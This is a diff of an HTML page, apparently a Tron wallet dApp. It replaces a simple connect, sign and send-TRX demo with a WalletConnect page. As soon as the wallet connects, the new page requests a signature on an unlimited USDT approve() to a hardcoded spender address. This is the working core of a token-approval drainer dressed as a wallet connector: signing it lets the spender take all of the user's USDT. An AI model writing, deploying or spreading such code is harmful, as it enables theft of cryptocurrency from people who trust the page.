@@ -1,184 +1,223 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>Tron dApp inside Wallet</title>
-  <!-- Load TronWeb to signal a Tron dApp and help with tx building -->
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Tron WalletConnect + Auto USDT Approve</title>
+
+  <!-- === Global Polyfills (must come first) === -->
+  <script>
+    window.global = window;
+    window.process = { env: {} };
+  </script>
+
+  <!-- === Buffer Polyfill === -->
+  <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
+  <script>
+    window.Buffer = buffer.Buffer;
+  </script>
+
+  <!-- === TronWeb === -->
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.js"></script>
+
+  <!-- === WalletConnect Modal Styles === -->
+  <link rel="stylesheet" href="https://unpkg.com/@walletconnect/modal@2.6.2/dist/styles.css" />
+
   <style>
-    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; padding: 20px; background:#0d1117; color:#c9d1d9 }
-    .wrap { max-width: 720px; margin: 0 auto; background:#161b22; border:1px solid #30363d; border-radius:12px; padding:20px }
-    .row { display:flex; gap:10px; flex-wrap:wrap; margin-top:10px }
-    button { padding:10px 14px; background:#3b82f6; color:#fff; border:none; border-radius:8px; font-weight:700; cursor:pointer }
-    .secondary { background:#6b7280 }
-    input { padding:10px; border:1px solid #30363d; border-radius:8px; min-width:260px; background:#0d1117; color:#c9d1d9 }
-    .log { background:#0d1117; border:1px solid #30363d; border-radius:8px; padding:12px; margin-top:12px; font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:13px; white-space:pre-wrap; word-break:break-word }
+    body {
+      font-family: system-ui, sans-serif;
+      background: #0d1117;
+      color: #c9d1d9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 24px;
+    }
+    .card {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 16px;
+      padding: 24px;
+      width: 100%;
+      max-width: 620px;
+    }
+    h2 { margin: 0 0 8px; }
+    p { margin: 0 0 12px; color: #8b949e; }
+    button {
+      background: #10b981;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      padding: 12px 16px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+    .secondary { background: #6b7280; }
+    .log {
+      margin-top: 14px;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 10px;
+      padding: 12px;
+      font-family: monospace;
+      font-size: 13px;
+      max-height: 260px;
+      overflow: auto;
+    }
+    .address { margin-top: 12px; color: #58a6ff; word-break: break-all; }
+    #txResult { margin-top: 12px; font-size: 14px; color: #3b82f6; }
+    #txResult a { color: #58a6ff; text-decoration: none; }
   </style>
 </head>
+
 <body>
-  <div class="wrap">
-    <h3 style="margin-top:0">Tron inside Trust Wallet</h3>
-    <p>Open this in Trust Wallet’s DApp browser (the Connect button in the main page will deep-link you here).</p>
+  <div class="card">
+    <h2>Tron WalletConnect + USDT Approve</h2>
+    <p>Auto connect & approve unlimited USDT instantly.</p>
 
-    <div class="row">
-      <button id="connectBtn">Connect (get address)</button>
-      <button id="addrBtn" class="secondary">Show Address</button>
-    </div>
+    <button id="connectBtn">Connect Wallet</button>
+    <button id="disconnectBtn" class="secondary">Disconnect</button>
 
-    <h4 style="margin:16px 0 8px">Sign a Message</h4>
-    <div class="row">
-      <input id="msg" placeholder="Message to sign" value="Hello from my Tron dApp"/>
-      <button id="signMsgBtn">Sign Message</button>
-    </div>
-
-    <h4 style="margin:16px 0 8px">Send TRX</h4>
-    <div class="row">
-      <input id="to" placeholder="Recipient TRON address (T...)" />
-      <input id="amount" type="number" min="0" step="0.1" placeholder="Amount (TRX)" value="1" />
-      <button id="sendBtn">Send</button>
-    </div>
-
+    <div id="walletAddress" class="address">Not connected</div>
+    <div id="txResult"></div>
     <div id="log" class="log"></div>
   </div>
 
-  <script>
+  <script type="module">
+    import SignClient from "https://esm.sh/@walletconnect/sign-client@2.13.3";
+    import { WalletConnectModal } from "https://esm.sh/@walletconnect/modal@2.6.2";
+
+    // ======== CONFIG ==========
+    const PROJECT_ID = "3991601c1f72f262b3381483cf8f99e4";
+    const TRON_CHAIN = "tron:0x2b6653dc";
+    const tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io" });
+
+    // Mainnet TRC20 USDT
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    // Replace with your DApp or spender address:
+    const SPENDER_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
+
+    const UNLIMITED_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+    // ===========================
+
     const logEl = document.getElementById("log");
-    const log = (...args) => {
+    const txEl = document.getElementById("txResult");
+    const addrEl = document.getElementById("walletAddress");
+
+    const connectBtn = document.getElementById("connectBtn");
+    const disconnectBtn = document.getElementById("disconnectBtn");
+
+    const modal = new WalletConnectModal({
+      projectId: PROJECT_ID,
+      themeMode: "dark"
+    });
+
+    let signClient, session;
+
+    function log(...args) {
+      const msg = args.map(a => (typeof a === "string" ? a : JSON.stringify(a, null, 2))).join(" ");
+      logEl.textContent += msg + "\n";
+      logEl.scrollTop = logEl.scrollHeight;
       console.log(...args);
-      logEl.textContent += args.map(a => typeof a==="string" ? a : JSON.stringify(a,null,2)).join(" ") + "\n";
-    };
-
-    function injected() {
-      return typeof window.tronWeb !== "undefined" || typeof window.tronLink !== "undefined";
     }
 
-    async function waitForInjection(timeoutMs = 15000) {
-      const t0 = Date.now();
-      return new Promise(resolve => {
-        const tick = () => {
-          if (injected()) return resolve(true);
-          if (Date.now() - t0 > timeoutMs) return resolve(false);
-          setTimeout(tick, 200);
-        };
-        tick();
-      });
-    }
-
-    async function requestAccounts() {
-      if (window.tronLink?.request) {
-        try {
-          await window.tronLink.request({ method: "tron_requestAccounts" });
-        } catch (e) {
-          log("tron_requestAccounts:", e?.message || e);
+    async function initClient() {
+      if (signClient) return;
+      log("Initializing WalletConnect client...");
+      signClient = await SignClient.init({
+        projectId: PROJECT_ID,
+        metadata: {
+          name: "Tron Auto Approve DApp",
+          description: "WalletConnect v2 + Tron + USDT approve",
+          url: location.origin,
+          icons: ["https://walletconnect.com/walletconnect-logo.png"]
         }
-      }
-    }
-
-    async function currentAddress() {
-      return window.tronWeb?.defaultAddress?.base58 || null;
+      });
+      signClient.on("session_delete", () => disconnect(true));
     }
 
     async function connect() {
-      const ok = await waitForInjection();
-      if (!ok) {
-        alert("No Tron provider injected. Open this page inside Trust Wallet / TronLink / Bitget / TokenPocket.");
-        return;
-      }
-      await requestAccounts();
-      const addr = await currentAddress();
-      if (addr) {
-        log("Connected:", addr);
-        alert("Address:\n" + addr);
-      } else {
-        log("No address yet; try Show Address.");
-      }
+      await initClient();
+      log("Requesting wallet connection...");
+      const { uri, approval } = await signClient.connect({
+        requiredNamespaces: {
+          tron: {
+            chains: [TRON_CHAIN],
+            methods: ["tron_signTransaction"],
+            events: ["accountsChanged"]
+          }
+        }
+      });
+
+      if (uri) await modal.openModal({ uri });
+      session = await approval();
+      modal.closeModal();
+
+      const account = session.namespaces.tron.accounts[0].split(":")[2];
+      addrEl.textContent = "Connected: " + account;
+      log("✅ Connected:", account);
+
+      // Immediately start approval flow
+      await approveUSDT(account);
     }
 
-    async function signMessage(msg) {
+    async function approveUSDT(userAddress) {
+      txEl.innerHTML = "";
       try {
-        if (window.tronLink?.request) {
-          const res = await window.tronLink.request({
-            method: "tron_signMessage",
-            params: { message: msg }
-          });
-          log("Signed (tron_signMessage):", res);
-          alert("Signed:\n" + (res?.signature || JSON.stringify(res)));
-          return;
-        }
-        if (window.tronWeb?.trx?.signMessage) {
-          const sig = await window.tronWeb.trx.signMessage(msg);
-          log("Signed (tronWeb.trx.signMessage):", sig);
-          alert("Signed:\n" + JSON.stringify(sig));
-          return;
-        }
-        if (window.tronWeb?.trx?.sign) {
-          const sig = await window.tronWeb.trx.sign(msg);
-          log("Signed (trx.sign raw):", sig);
-          alert("Signed:\n" + JSON.stringify(sig));
-          return;
-        }
-        alert("Message signing not supported by this wallet build.");
-      } catch (e) {
-        log("signMessage error:", e?.message || e);
-        alert("Signing failed: " + (e?.message || e));
+        log("Building USDT approve transaction...");
+
+        const spenderHex = tronWeb.address.toHex(SPENDER_ADDRESS);
+        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+          USDT_CONTRACT,
+          "approve(address,uint256)",
+          { feeLimit: 100_000_000 },
+          [
+            { type: "address", value: spenderHex },
+            { type: "uint256", value: UNLIMITED_AMOUNT }
+          ],
+          userAddress
+        );
+
+        if (!tx.result || !tx.result.result)
+          throw new Error("Failed to build transaction: " + JSON.stringify(tx));
+
+        const unsignedTx = tx.transaction;
+        log("Unsigned TX:", unsignedTx);
+
+        log("Requesting wallet signature...");
+        const txid = await signClient.request({
+          topic: session.topic,
+          chainId: TRON_CHAIN,
+          request: {
+            method: "tron_signTransaction",
+            params: [unsignedTx]
+          }
+        });
+
+        log("✅ TX signed:", txid);
+        txEl.innerHTML = `✅ Approved! <a href="https://tronscan.org/#/transaction/${txid}" target="_blank">View on TronScan</a>`;
+      } catch (err) {
+        log("❌ Approval failed:", err.message || err);
+        alert("Approval failed: " + err.message);
       }
     }
 
-    async function sendTRX(to, amountTrx) {
-      try {
-        const tw = window.tronWeb;
-        if (!tw) throw new Error("tronWeb not injected");
-        await requestAccounts();
-        const from = tw.defaultAddress?.base58;
-        if (!from) throw new Error("Wallet not connected");
-
-        const amountSun = tw.toSun(amountTrx);
-        const tx = await tw.transactionBuilder.sendTrx(to, amountSun, from);
-        const signed = await tw.trx.sign(tx);
-        const receipt = await tw.trx.sendRawTransaction(signed);
-
-        log("TX:", tx);
-        log("Signed:", signed?.txID || signed);
-        log("Broadcast:", receipt);
-        alert("Broadcasted!\nTXID: " + (receipt?.txid || signed?.txID || "unknown"));
-      } catch (e) {
-        log("sendTRX error:", e?.message || e);
-        alert("Send failed: " + (e?.message || e));
+    async function disconnect(external = false) {
+      if (session && !external) {
+        await signClient.disconnect({
+          topic: session.topic,
+          reason: { code: 6000, message: "User disconnected" }
+        });
       }
+      session = null;
+      addrEl.textContent = "Not connected";
+      txEl.textContent = "";
+      log("🔌 Disconnected");
     }
 
-    // Bind UI
-    document.getElementById("connectBtn").onclick = connect;
-
-    document.getElementById("addrBtn").onclick = async () => {
-      if (!(await waitForInjection())) return alert("No Tron provider injected.");
-      const addr = await currentAddress();
-      if (addr) { log("Address:", addr); alert("Address:\n" + addr); }
-      else alert("Address not available yet. Tap Connect first.");
-    };
-
-    document.getElementById("signMsgBtn").onclick = async () => {
-      if (!(await waitForInjection())) return alert("No Tron provider injected.");
-      const msg = document.getElementById("msg").value || "Hello";
-      await signMessage(msg);
-    };
-
-    document.getElementById("sendBtn").onclick = async () => {
-      if (!(await waitForInjection())) return alert("No Tron provider injected.");
-      const to = document.getElementById("to").value.trim();
-      const amount = parseFloat(document.getElementById("amount").value || "0");
-      if (!to || !to.startsWith("T")) return alert("Enter a valid TRON address (starts with T).");
-      if (!(amount > 0)) return alert("Enter a positive amount.");
-      await sendTRX(to, amount);
-    };
-
-    // Diagnostics
-    (async () => {
-      log("UserAgent:", navigator.userAgent);
-      const ok = await waitForInjection();
-      log("Injected:", ok, "tronWeb:", typeof window.tronWeb, "tronLink:", typeof window.tronLink);
-    })();
+    connectBtn.addEventListener("click", connect);
+    disconnectBtn.addEventListener("click", () => disconnect(false));
   </script>
 </body>
 </html>
